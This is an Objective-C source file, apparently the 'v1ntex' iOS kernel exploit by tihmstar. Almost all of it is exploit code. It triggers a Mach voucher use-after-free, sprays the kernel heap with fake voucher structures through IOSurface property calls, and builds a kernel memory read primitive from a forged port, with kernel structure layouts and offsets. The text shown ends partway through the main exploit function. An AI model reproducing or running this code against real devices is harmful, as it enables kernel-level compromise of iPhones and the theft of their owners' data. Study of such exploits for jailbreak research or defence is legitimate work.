//
//  exploit.m
//  v1ntex
//
//  Created by tihmstar on 23.01.19.
//  Copyright Â© 2019 tihmstar. All rights reserved.
//

#include "v1ntex_exploit.h"
#include "v1ntex_offsets.h"
#include <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <mach-o/loader.h>
#include <mach/host_priv.h>
#include <mach/mach_error.h>
#include <mach/mach_host.h>
#include <mach/mach_port.h>
#include <mach/mach_time.h>
#include <mach/task.h>
#include <mach/thread_act.h>
#include <pthread/pthread.h>
#include <sched.h>
#include <sys/mman.h>

static const uint32_t IOSURFACE_CREATE_SURFACE = 0;
static const uint32_t IOSURFACE_SET_VALUE = 9;
static const uint32_t IOSURFACE_GET_VALUE = 10;
static const uint32_t IOSURFACE_DELETE_VALUE = 11;
static const uint32_t IKOT_TASK = 2;

#define IOSURFACE_CREATE_OUTSIZE 0xbc8 /* XXX 0x6c8 for iOS 11.0, 0xbc8 for 11.1.2 */
#define OFFSET_TASK_ITK_SELF 0xd8
#define OFFSET_IOUSERCLIENT_IPC 0x9c
#define BSDINFO_PID_OFFSET 0x10

//real offsets
#define OFFSET_TASK_BSD_INFO 0x368
#define BSDINFO_PID_OFFSET 0x10
#define OFFSET_IPC_SPACE_IS_TASK 0x28
#define OFFSET_TASK_ITK_REGISTERED 0x2f0
#define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX 183
#define OFFSET_KERNELBASE 0xfffffff007004000
#define OFFSET_PROC_UCRED 0x100
#define OFFSET_VM_MAP_HDR 0x10
#define OFFSET_SIZEOF_TASK 0x568
#define OFFSET_REALHOST_SPECIAL 0x10

#define KERNEL_MAGIC MH_MAGIC_64
#define KERNEL_SLIDE_STEP 0x100000
#define KERNEL_HEADER_OFFSET 0x4000

enum {
    kOSSerializeDictionary = 0x01000000U,
    kOSSerializeArray = 0x02000000U,
    kOSSerializeSet = 0x03000000U,
    kOSSerializeNumber = 0x04000000U,
    kOSSerializeSymbol = 0x08000000U,
    kOSSerializeString = 0x09000000U,
    kOSSerializeData = 0x0a000000U,
    kOSSerializeBoolean = 0x0b000000U,
    kOSSerializeObject = 0x0c000000U,

    kOSSerializeTypeMask = 0x7F000000U,
    kOSSerializeDataMask = 0x00FFFFFFU,

    kOSSerializeEndCollection = 0x80000000U,

    kOSSerializeMagic = 0x000000d3U,
};

// IOKit cruft
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
extern const mach_port_t kIOMasterPortDefault;
CFMutableDictionaryRef IOServiceMatching(const char* name) CF_RETURNS_RETAINED;
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t* client);
kern_return_t IOServiceClose(io_connect_t client);
kern_return_t IOConnectCallStructMethod(mach_port_t connection, uint32_t selector, const void* inputStruct, size_t inputStructCnt, void* outputStruct, size_t* outputStructCnt);
kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint32_t* reference, uint32_t referenceCnt, const void* inputStruct, size_t inputStructCnt, void* outputStruct, size_t* outputStructCnt);
kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);

kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t* dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t* cur_prot, vm_prot_t* max_prot, vm_inherit_t inherit);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

#define error(a...) \
    do {            \
        LOG(a);     \
        LOG("");    \
    } while (0)
#define assure(a)           \
    do {                    \
        if ((a) == 0) {     \
            err = __LINE__; \
            goto error;     \
        }                   \
    } while (0)
#define reterror(a...)  \
    {                   \
        error(a);       \
        err = __LINE__; \
        goto error;     \
    }
#define doassure(cond, code) \
    do {                     \
        if (!(cond)) {       \
            (code);          \
            assure(cond);    \
        }                    \
    } while (0)

#define RELEASE_PORT(port)                                   \
    do {                                                     \
        if (MACH_PORT_VALID((port))) {                       \
            _kernelrpc_mach_port_destroy_trap(self, (port)); \
            port = MACH_PORT_NULL;                           \
        }                                                    \
    } while (0)

typedef struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
#ifdef __LP64__
        uint32_t pad;
#endif
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
#ifdef __LP64__
            uint32_t pad;
#endif
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests; //this one is refcount
    union {
        kptr_t* premsg;
        struct {
            uint8_t sync_qos[7];
            uint8_t special_port_qos;
        } qos_counter;
    } kdata2;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount; //offset 0x28
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef volatile union {
    struct {
        struct {
            kptr_t data;
            uint32_t reserved : 24,
                type : 8;
#ifdef __LP64__
            uint32_t pad;
#endif
        } lock; // mutex lock
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
#ifdef __LP64__
        uint32_t pad;
#endif
        kptr_t map;
    } a;
    struct {
        char pad[OFFSET_TASK_ITK_SELF];
        kptr_t itk_self;
    } b;
} ktask_t;

typedef volatile union {
    struct {
        // IOUserClient fields
        kptr_t vtab;
        uint32_t refs;
        uint32_t pad;
        // Gadget stuff
        kptr_t trap_ptr;
        // IOExternalTrap fields
        kptr_t obj;
        kptr_t func;
        uint32_t break_stuff; // idk wtf this field does, but it has to be zero or iokit_user_client_trap does some weird pointer mashing
        // OSSerializer::serialize
        kptr_t indirect[3];
    } a;
    struct {
        char pad[OFFSET_IOUSERCLIENT_IPC];
        int32_t __ipc;
    } b;
} kobj_t;

typedef volatile struct {
    kptr_t prev;
    kptr_t next;
    kptr_t start;
    kptr_t end;
} kmap_hdr_t;

typedef struct {
    uint32_t iv_hash; /* checksum hash */
    uint32_t iv_sum; /* checksum of values */
    uint32_t iv_refs; /* reference count */
    uint32_t iv_table_size; /* size of the voucher table */
    uint32_t iv_inline_table[MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN];
    kptr_t iv_table; /* table of voucher attr entries */
    kptr_t iv_port; /* port representing the voucher */
    struct queue_entry {
        kptr_t next;
        kptr_t prev;
    } iv_hash_link;
} __attribute__((packed)) voucher_t;

static uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for (size_t i = 0; val > 0; i += 8) {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

#define NUM_BEFORE 0x1000
#define NUM_AFTER 0x100
#define NUM_AFTER2 0x2000
static mach_port_t after[NUM_AFTER] = { MACH_PORT_NULL };
static mach_port_t after2[NUM_AFTER2] = { MACH_PORT_NULL };
static mach_port_t before[NUM_BEFORE] = { MACH_PORT_NULL };

static int gfakeport_idx = -1;
static mach_port_t real_port_to_fake_voucher = MACH_PORT_NULL;
static task_t self = MACH_PORT_NULL;

static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name, mach_vm_address_t* context)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        mach_port_name_t name;
    } Request __attribute__((unused));
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_vm_address_t context;
        mach_msg_trailer_t trailer;
    } Reply __attribute__((unused));
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_vm_address_t context;
    } __Reply __attribute__((unused));
#pragma pack()

    union {
        Request In;
        Reply Out;
    } Mess;

    Request* InP = &Mess.In;
    Reply* Out0P = &Mess.Out;

    InP->NDR = NDR_record;
    InP->name = name;
    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = task;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 3228;
    InP->Head.msgh_reserved = 0;

    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if (ret == KERN_SUCCESS)
        ret = Out0P->RetCode;

    if (ret == KERN_SUCCESS)
        *context = Out0P->context;

    return ret;
}

static kern_return_t my_mach_port_set_context(task_t task, mach_port_name_t name, mach_vm_address_t context)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        mach_port_name_t name;
        mach_vm_address_t context;
    } Request;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()

    union {
        Request In;
        Reply Out;
    } Mess;

    Request* InP = &Mess.In;
    Reply* OutP = &Mess.Out;

    InP->NDR = NDR_record;
    InP->name = name;
    InP->context = context;
    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = task;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 3229;
    InP->Head.msgh_reserved = 0;

    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if (ret == KERN_SUCCESS)
        ret = OutP->RetCode;

    return ret;
}

static void spinner_empty(mach_port_t* arg)
{
    while (!*arg)
        ; //spin
}

static void spinner_nonempty(uint64_t* arg)
{
    while (*arg)
        ; //spin
}

// Raw MIG function for a merged IOSurface deleteValue + setValue call, attempting to increase performance.
// Prepare everything - sched_yield() - fire.
static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uint32_t propertyId, void* buf, mach_vm_size_t len)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        uint32_t inband_input[4];
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } DeleteRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } SetRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_type_number_t inband_outputCnt;
        char inband_output[4096];
        mach_msg_type_number_t scalar_outputCnt;
        uint64_t scalar_output[16];
        mach_vm_size_t ool_output_size;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()

    // Delete
    union {
        DeleteRequest In;
        Reply Out;
    } DMess;

    DeleteRequest* DInP = &DMess.In;
    Reply* DOutP = &DMess.Out;

    DInP->NDR = NDR_record;
    DInP->selector = IOSURFACE_DELETE_VALUE;
    DInP->scalar_inputCnt = 0;

    DInP->inband_input[0] = surfaceId;
    DInP->inband_input[2] = transpose(propertyId);
    DInP->inband_input[3] = 0x0; // Null terminator
    DInP->inband_inputCnt = sizeof(DInP->inband_input);

    DInP->ool_input = 0;
    DInP->ool_input_size = 0;

    DInP->inband_outputCnt = sizeof(uint32_t);
    DInP->scalar_outputCnt = 0;
    DInP->ool_output = 0;
    DInP->ool_output_size = 0;

    DInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    DInP->Head.msgh_remote_port = client;
    DInP->Head.msgh_local_port = mig_get_reply_port();
    DInP->Head.msgh_id = 2865;
    DInP->Head.msgh_reserved = 0;

    // Set
    union {
        SetRequest In;
        Reply Out;
    } SMess;

    SetRequest* SInP = &SMess.In;
    Reply* SOutP = &SMess.Out;

    SInP->NDR = NDR_record;
    SInP->selector = IOSURFACE_SET_VALUE;
    SInP->scalar_inputCnt = 0;

    SInP->inband_inputCnt = 0;

    SInP->ool_input = (mach_vm_address_t)buf;
    SInP->ool_input_size = len;

    SInP->inband_outputCnt = sizeof(uint32_t);
    SInP->scalar_outputCnt = 0;
    SInP->ool_output = 0;
    SInP->ool_output_size = 0;

    SInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    SInP->Head.msgh_remote_port = client;
    SInP->Head.msgh_local_port = mig_get_reply_port();
    SInP->Head.msgh_id = 2865;
    SInP->Head.msgh_reserved = 0;

    kern_return_t ret = 0;
    kern_return_t retf = 0;

    // Deep breath
    usleep(420);
    sched_yield();

    // Fire
    ret = mach_msg(&DInP->Head, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE, sizeof(DeleteRequest), (mach_msg_size_t)sizeof(Reply), DInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    retf = mach_msg(&SInP->Head, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE, sizeof(SetRequest), (mach_msg_size_t)sizeof(Reply), SInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if (ret == KERN_SUCCESS)
        ret = DOutP->RetCode;

    if (ret != KERN_SUCCESS)
        return ret;

    if (retf == KERN_SUCCESS)
        retf = SOutP->RetCode;

    return ret ? ret : retf;
}

static kern_return_t delete_val(io_connect_t client, uint32_t surfaceId, uint32_t propertyId)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        uint32_t inband_input[4];
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } DeleteRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_type_number_t inband_outputCnt;
        char inband_output[4096];
        mach_msg_type_number_t scalar_outputCnt;
        uint64_t scalar_output[16];
        mach_vm_size_t ool_output_size;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()

    // Delete
    union {
        DeleteRequest In;
        Reply Out;
    } DMess;

    DeleteRequest* DInP = &DMess.In;
    Reply* DOutP = &DMess.Out;

    DInP->NDR = NDR_record;
    DInP->selector = IOSURFACE_DELETE_VALUE;
    DInP->scalar_inputCnt = 0;

    DInP->inband_input[0] = surfaceId;
    DInP->inband_input[2] = transpose(propertyId);
    DInP->inband_input[3] = 0x0; // Null terminator
    DInP->inband_inputCnt = sizeof(DInP->inband_input);

    DInP->ool_input = 0;
    DInP->ool_input_size = 0;

    DInP->inband_outputCnt = sizeof(uint32_t);
    DInP->scalar_outputCnt = 0;
    DInP->ool_output = 0;
    DInP->ool_output_size = 0;

    DInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    DInP->Head.msgh_remote_port = client;
    DInP->Head.msgh_local_port = mig_get_reply_port();
    DInP->Head.msgh_id = 2865;
    DInP->Head.msgh_reserved = 0;

    // Fire
    kern_return_t ret = 0;
    ret = mach_msg(&DInP->Head, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE, sizeof(DeleteRequest), (mach_msg_size_t)sizeof(Reply), DInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if (ret == KERN_SUCCESS)
        ret = DOutP->RetCode;

    return ret;
}

static uint32_t kread32_slow(kptr_t loc)
{
    int err = 0;
    uint32_t pid = 0;
    kern_return_t ret = 0;
    uint64_t readptr = loc - BSDINFO_PID_OFFSET;
    for (int i = 0; i < NUM_AFTER2; i++) {
        assure(!(ret = my_mach_port_set_context(self, after2[i], readptr)));
    }

    for (int i = 0; i < NUM_BEFORE; i++) {
        assure(!(ret = my_mach_port_set_context(self, before[i], readptr)));
    }

    for (int i = 0; i < NUM_AFTER; i++) {
        assure(!(ret = my_mach_port_set_context(self, after[i], readptr)));
    }

    ret = pid_for_task(real_port_to_fake_voucher, (int*)&pid);

error:
    if (err) {
        LOG("kread32 failed!");
        LOG("error=%d ret=0x%08x s=%s", err, ret, mach_error_string(ret));
    }
    return pid;
}

static uint64_t kread64_slow(kptr_t loc)
{
    uint64_t rt = 0;
    rt = kread32_slow(loc);
    rt |= ((uint64_t)kread32_slow(loc + 4)) << 32;
    return rt;
}

static void increase_limits()
{
    struct rlimit lim = { 0 };
    int err = getrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        LOG("failed to get limits");
    }
    LOG("rlim.cur: %lld", lim.rlim_cur);
    LOG("rlim.max: %lld", lim.rlim_max);

    lim.rlim_cur = 10240;

    err = setrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        LOG("failed to set limits");
    }

    lim.rlim_cur = 0;
    lim.rlim_max = 0;
    err = getrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        LOG("failed to get limits");
    }
    LOG("rlim.cur: %lld", lim.rlim_cur);
    LOG("rlim.max: %lld", lim.rlim_max);
}

int v1ntex(v1ntex_cb_t callback, void* cb_data, v1ntex_offsets* v1ntex_offs)
{
    increase_limits();
    usleep(10000);

    int err = 0;
    kern_return_t ret = 0;
    kptr_t kbase = 0;
    task_t kernel_task = MACH_PORT_NULL;
    mach_vm_size_t pagesize = 0;

    self = mach_task_self();
    host_t host = mach_host_self();

    vm_size_t pgsz = 0;
    assure(!(ret = _host_page_size(host, &pgsz)));
    pagesize = pgsz;
    LOG("page size: 0x%llx, %s", pagesize, mach_error_string(ret));

    mach_port_t stuffport = MACH_PORT_NULL;

    mach_voucher_attr_recipe_data_t atm_data = {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = 510
    };

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    LOG("service: %x", service);
    assure(MACH_PORT_VALID(service));

    io_connect_t client = MACH_PORT_NULL;
    ret = IOServiceOpen(service, self, 0, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));
    assure(!ret);

    assure(MACH_PORT_VALID(client));
    uint32_t dict_create[] = {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        kOSSerializeSymbol | 19,
        0x75534f49,
        0x63616672,
        0x6c6c4165,
        0x6953636f,
        0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };

    union {
        char _padding[IOSURFACE_CREATE_OUTSIZE]; // XXX 0x6c8 for iOS 11
        struct {
            mach_vm_address_t addr1;
            mach_vm_address_t addr2;
            uint32_t id;
        } data;
    } surface;
    union {
        char _padding[IOSURFACE_CREATE_OUTSIZE]; // XXX 0x6c8 for iOS 11
        struct {
            mach_vm_address_t addr1;
            mach_vm_address_t addr2;
            uint32_t id;
        } data;
    } surface2;

    size_t size = sizeof(surface);
    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface, &size);
    LOG("newSurface: %s", mach_error_string(ret));
    assure(!ret);

    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &stuffport);
    LOG("stuffport: %x, %s", stuffport, mach_error_string(ret));
    assure(!ret && MACH_PORT_VALID(stuffport));

    ret = _kernelrpc_mach_port_insert_right_trap(self, stuffport, stuffport, MACH_MSG_TYPE_MAKE_SEND);
    LOG("mach_port_insert_right: %s", mach_error_string(ret));
    assure(!ret);
    mach_port_t realport = MACH_PORT_NULL;
    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &realport);

    doassure(!ret, {
        LOG("mach_port_allocate: %s", mach_error_string(ret));
    });
    doassure(MACH_PORT_VALID(realport), {
        LOG("realport: %x", realport);
    });
#define NUM_GC 0x1000
    mach_port_t gc[NUM_GC] = { MACH_PORT_NULL };
    for (size_t i = 0; i < NUM_GC; ++i) {
        ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &gc[i]);
        doassure(!ret, {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }

    for (size_t i = 0; i < NUM_BEFORE; ++i) {
        ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &before[i]);
        doassure(!ret, {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }

    mach_port_t p1 = MACH_PORT_NULL;
    assure(!(ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1)));

    for (size_t i = 0; i < NUM_AFTER; ++i) {
        ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &after[i]);
        doassure(!ret, {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }

#pragma pack(4)
    typedef struct {
        mach_msg_base_t base;
        mach_msg_ool_ports_descriptor_t desc[2];
    } StuffMsg;
#pragma pack()
    StuffMsg msg;
    msg.base.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.base.header.msgh_remote_port = stuffport;
    msg.base.header.msgh_local_port = MACH_PORT_NULL;
    msg.base.header.msgh_id = 1234;
    msg.base.header.msgh_reserved = 0;
    msg.base.body.msgh_descriptor_count = 2;
    msg.desc[0].address = before;
    msg.desc[0].count = NUM_BEFORE;
    msg.desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.desc[0].deallocate = FALSE;
    msg.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg.desc[1].address = after;
    msg.desc[1].count = NUM_AFTER;
    msg.desc[1].disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.desc[1].deallocate = FALSE;
    msg.desc[1].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    ret = mach_msg(&msg.base.header, MACH_SEND_MSG, (mach_msg_size_t)sizeof(msg), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    LOG("mach_msg: %s", mach_error_string(ret));
    assure(!ret);

    for (size_t i = NUM_AFTER; i > 0; --i) {
        if (MACH_PORT_VALID(after[i - 1])) {
            ret = _kernelrpc_mach_port_destroy_trap(self, after[i - 1]);
            after[i - 1] = MACH_PORT_NULL;
        }
    }
    for (size_t i = NUM_BEFORE; i > 0; --i) {
        if (MACH_PORT_VALID(before[i - 1])) {
            ret = _kernelrpc_mach_port_destroy_trap(self, before[i - 1]);
            before[i - 1] = MACH_PORT_NULL;
        }
    }

#define DATA_PAGE_SIZE 0x1000
    uint32_t dict[DATA_PAGE_SIZE / sizeof(uint32_t) + 7] = {
        // Some header or something
        surface.data.id,
        0x0,
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeArray | 2,
        kOSSerializeString | (DATA_PAGE_SIZE - 1),
    };
    dict[DATA_PAGE_SIZE / sizeof(uint32_t) + 5] = kOSSerializeEndCollection | kOSSerializeString | 4;

    voucher_t newVoucher = {
        .iv_hash = 0,
        .iv_sum = 0x11,
        .iv_refs = 99,
        .iv_inline_table[0] = 0x4000,
        .iv_inline_table[1] = 0x4000,
        .iv_inline_table[2] = 0x4000,
        .iv_inline_table[3] = 0x4000,
        .iv_inline_table[4] = 0x4000,
        .iv_inline_table[5] = 0x4000,
        .iv_inline_table[6] = 0x4000,
        .iv_inline_table[7] = 0x4000,
        .iv_table = 0,
        .iv_port = 0,
    };

    int vouchers_in_osstring = 0;
    for (uintptr_t ptr = (uintptr_t)&dict[5], end = (uintptr_t)&dict[5] + DATA_PAGE_SIZE; ptr + sizeof(voucher_t) <= end; ptr += sizeof(voucher_t)) {
        *(volatile voucher_t*)ptr = newVoucher;
        vouchers_in_osstring++;
    }

    mach_port_t p2 = MACH_PORT_NULL;
    assure(!(ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p2)));

    mach_port_t p3 = MACH_PORT_NULL;
    assure(!(ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p3)));

    mach_port_t p4 = MACH_PORT_NULL;
    assure(!(ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p4)));

    assure(!(ret = thread_set_mach_voucher(mach_thread_self(), p1)));

    assure(!(ret = task_swap_mach_voucher(self, p1, &p2)));

    for (size_t i = NUM_GC; i > 0; --i) {
        if (MACH_PORT_VALID(gc[i - 1])) {
            _kernelrpc_mach_port_destroy_trap(self, gc[i - 1]);
            gc[i - 1] = MACH_PORT_NULL;
        }
    }
    LOG("herp derp");
    usleep(150000);

    sched_yield();
    ret = task_swap_mach_voucher(self, p1, &p3); //magic voucher free
    LOG("task_swap_mach_voucher: %s", mach_error_string(ret));
    assure(!ret);

    _kernelrpc_mach_port_destroy_trap(self, stuffport);

    size_t finalI = 0;
    for (size_t i = 0; i < NUM_GC; ++i) {
        uint64_t t0, t1;
        t0 = mach_absolute_time();
        ret = host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &gc[i]);
        t1 = mach_absolute_time();
        doassure(!ret, {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
        if (t1 - t0 > 1000) {
            LOG("my_gc breaking at %d with tdiff=%lld", (int)i, t1 - t0);
            finalI = i;
            break;
        }
    }

#define SPRAY_SIZE 0x4000
    for (uint32_t i = 0; i < SPRAY_SIZE; ++i) {
        dict[DATA_PAGE_SIZE / sizeof(uint32_t) + 6] = transpose(i);

        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
        doassure(!ret, {
            LOG("setValue(%u): %s", i, mach_error_string(ret));
        });
    }

    //reset GC workaround
    for (size_t i = 0; i <= finalI; i++) {
        if (MACH_PORT_VALID(gc[i - 1])) {
            _kernelrpc_mach_port_destroy_trap(self, gc[i - 1]);
            gc[i - 1] = MACH_PORT_NULL;
        }
    }

    for (size_t i = 0; i < NUM_AFTER2; ++i) {
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &after2[i]);
        doassure(!ret, {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }

    for (size_t i = 0; i < NUM_BEFORE; ++i) {
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &before[i]);
        doassure(!ret, {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }

    //alloc port in voucher
    assure(!(ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher)));

    for (size_t i = 0; i < NUM_AFTER; ++i) {
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &after[i]);
        doassure(!ret, {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }

    uint32_t request[] = {
        // Same header
        surface.data.id,
        0x0,
        0, // Key
        0x0, // Null terminator
    };

    uint32_t response[4 + (DATA_PAGE_SIZE / sizeof(uint32_t))] = { 0 };
    size = sizeof(response);

    kptr_t port_address = 0;
    int fake_voucher_idx = 0;
    int fake_voucher_jdx = 0;
    voucher_t targetVoucher = {};

    for (int i = 0; i < SPRAY_SIZE && !port_address; i++) {
        request[2] = transpose(i);
        assure(!(ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size)));

        voucher_t* v = (voucher_t*)&response[4];
        for (int j = 0; j < vouchers_in_osstring; j++) {
            if (v[j].iv_port) {
                targetVoucher = v[j];
                port_address = targetVoucher.iv_port;
                fake_voucher_idx = i;
                fake_voucher_jdx = j;
                LOG("port_address=%p", (void*)port_address);
                LOG("fake_voucher_idx=%d", fake_voucher_idx);
                LOG("fake_voucher_jdx=%d", fake_voucher_jdx);

                targetVoucher.iv_port &= ~(DATA_PAGE_SIZE - 1);
                targetVoucher.iv_port += 0x4000 * 64; //4kPage

                LOG("Shifted Port!");
                break;
            }
        }
    }
    assure(port_address);

    size = sizeof(surface);
